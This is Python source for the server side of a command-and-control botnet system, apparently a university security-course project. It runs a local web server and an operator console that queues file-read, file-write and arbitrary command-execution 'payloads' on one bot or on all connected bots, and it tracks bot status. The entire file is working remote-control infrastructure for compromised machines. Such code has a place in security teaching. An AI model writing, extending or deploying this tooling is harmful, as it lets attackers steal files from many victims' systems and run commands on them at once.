# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from aiohttp import web
from context import GlobalContext, Command
import shlex
import routes
import aioconsole
import asyncio
import argparse
import base64


app = web.Application()
app["ctx"] = GlobalContext()
app.add_routes(routes.ALL_ROUTES)


def read_file_sync(path: str) -> bytes:
    # note: reading in binary mode to get `bytes` object from f.read()
    with open(path,  "rb") as f:
        return f.read()


async def read_file(path: str) -> bytes:
    loop = asyncio.get_event_loop()

    # we need to avoid blocking the executor even more here than we do in bot.py,
    # because we could potentially have requests hit while we're reading. we really
    # don't want to block too long and make a request timeout or something
    return await loop.run_in_executor(None, lambda: read_file_sync(path))


async def parse_command_from_cli(rest: list[str]) -> Command:
    match rest[0]:
        case "read":
            return Command.read(rest[1])
        case "write":
            data = await read_file(rest[2])
            b64 = base64.standard_b64encode(data).decode()
            return Command.write(rest[1], b64)
        case "execute":
            return Command.execute(rest[1], rest[2:])
        case _:
            raise Exception(f"unknown command action '{rest[0]}'")


async def queue_command_on_single_bot(ctx: GlobalContext, args: list[str]) -> None:
    id = args[0]
    cmd = await parse_command_from_cli(args[1:])

    if not ctx.command_one(id, cmd):
        print(f"unknown bot '{id}', failed to execute")
    else:
        print(f"queued command on '{id}' successfully")


async def queue_command_on_all(ctx: GlobalContext, args: list[str]) -> None:
    cmd = await parse_command_from_cli(args[0:])
    ctx.command_all(cmd)

    print(f"queued command on '{ctx.known_bots()}' bots successfully")


def server_status(ctx: GlobalContext) -> None:
    print("current status:")
    print(f"    total bots: {ctx.known_bots()}")
    print(f"    total commands given to bots: {ctx.commands_given()}")
    print(f"    total commands executed: {ctx.commands_executed()}")
    print(f"    all known bots:")

    for id in ctx.all_known_ids():
        print(f"        {id}")


async def main():
    parser = argparse.ArgumentParser(
        prog="c2-server",
        description="Server for C2 system")

    parser.add_argument(
        "output", help="The path to write bot results to (e.g. read files, command outputs)")

    args = parser.parse_args()

    app["output-folder"] = args.output

    # this runs the web server as a "background task" effectively
    # within asyncio, allowing us to still do stuff in the "foreground"
    # while the web server is going.
    #
    # this is necessary for the user input code below
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "localhost", 8080)
    await site.start()

    # note: the type hint is for my editor"s autocomplete
    ctx: GlobalContext = app["ctx"]

    while True:
        text: str = await aioconsole.ainput("> ")

        # shlex is a Python built-in library that effectively "splits a string
        # the way that `sh` would".
        #
        # The reason I use this is so you can type things via. string literals
        # and have them maintained, e.g. you can input the following:
        #
        #    > all execute /usr/bin/bash -c "echo "Hello!" && echo "Goodbye!""
        #
        # and have `command` be ["all", "execute", "/usr/bin/bash", "-c", "echo "Hello!" && echo "Goodbye!""]
        command = shlex.split(text)

        try:
            # one <id> <command>
            if command[0] == "one":
                await queue_command_on_single_bot(ctx, command[1:])
            # all <command>
            elif command[0] == "all":
                await queue_command_on_all(ctx, command[1:])
            # status
            elif command[0] == "status":
                server_status(ctx)
            # help
            elif command[0] in ["?", "help"]:
                print(("Commands:\n\n"
                       "Execute payload on one bot:\n"
                       "    one <id> <command>\n\n"
                       "Execute payload on all bots:\n"
                       "    all <command>\n\n"
                       "Show status of connected bots:\n"
                       "    status\n"))
            # unknown
            elif command[0] == "exit":
                print("Exiting...")
                exit(0)
            else:
                print(f"unknown command '{command[0]}'")
        except Exception as e:
            print(f"unable to run command '{text}'. reason:")
            print(f"    {repr(e)}")


if __name__ == "__main__":
    asyncio.run(main())
